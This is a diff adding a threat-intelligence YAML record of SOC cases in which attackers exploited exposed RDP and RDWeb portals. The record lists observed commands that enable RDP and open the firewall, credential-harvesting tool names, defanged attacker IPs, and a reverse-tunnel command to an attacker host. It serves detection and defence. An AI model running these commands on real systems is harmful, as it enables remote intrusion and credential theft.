@@ -1,0 +1,57 @@
+title: RDP Exposure and Lateral Movement Incidents Observed in SOC Cases
+description: Threat actors exploited exposed RDP and RDWeb portals, a vulnerable SonicWall
+  VPN, and used living-off-the-land techniques to enable RDP access and harvest credentials.
+  Multiple real-world SOC cases illustrate opportunistic attacks leveraging overlooked
+  misconfigurations.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - BypassCredGuard.exe
+  - SharpDecryptPwd.exe
+  - agent.exe
+  command_lines:
+  - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+    /t REG_DWORD /d 0 /f
+  - net stop TermService && timeout /t 2 && net start TermService
+  - netsh advfirewall firewall add rule name="RDP-Open" dir=in protocol=TCP localport=3389
+    action=allow enable=yes
+  - netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+  - cmd.exe /Q /c netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+    1> \Windows\Temp\AXqtxC281
+  - agent.exe -server 45.61.157[.]149:9001 -hide
+  powershell: []
+  scripts: []
+  registry_keys:
+  - HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
+  image_loads: []
+  network_connections:
+  - agent.exe -> 45.61.157[.]149:9001
+  file_activity:
+  - C:\Windows\system32\cmd.exe
+  - \Windows\Temp\AXqtxC281
+  persistence:
+  - Attacker modified registry value HKLM\SYSTEM\CurrentControlSet\Control\Terminal
+    Server fDenyTSConnections to enable RDP
+  - Attacker added firewall rule named RDP-Open to allow inbound TCP on port 3389
+  - Custom reverse tunnel (agent.exe) deployed for persistent access with Windows
+    and Linux builds
+  - Attacker returned to same exposed RDWeb portal using a different compromised account
+    after initial eviction
+  process_relations:
+  - cmd.exe -> netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+iocs:
+  hashes: []
+  ip_addresses:
+  - 91.92.243[.]33
+  - 45.61.157[.]149
+  - 72.62.82[.]195
+  - 151.241.100[.]179
+  domains: []
+  urls: []
+authors: []
+reference: https://www.huntress.com/blog/exposed-rdp-misconfiguration-risks
+date_of_publication: May 22, 2026
+file_creation_date: May 22, 2026
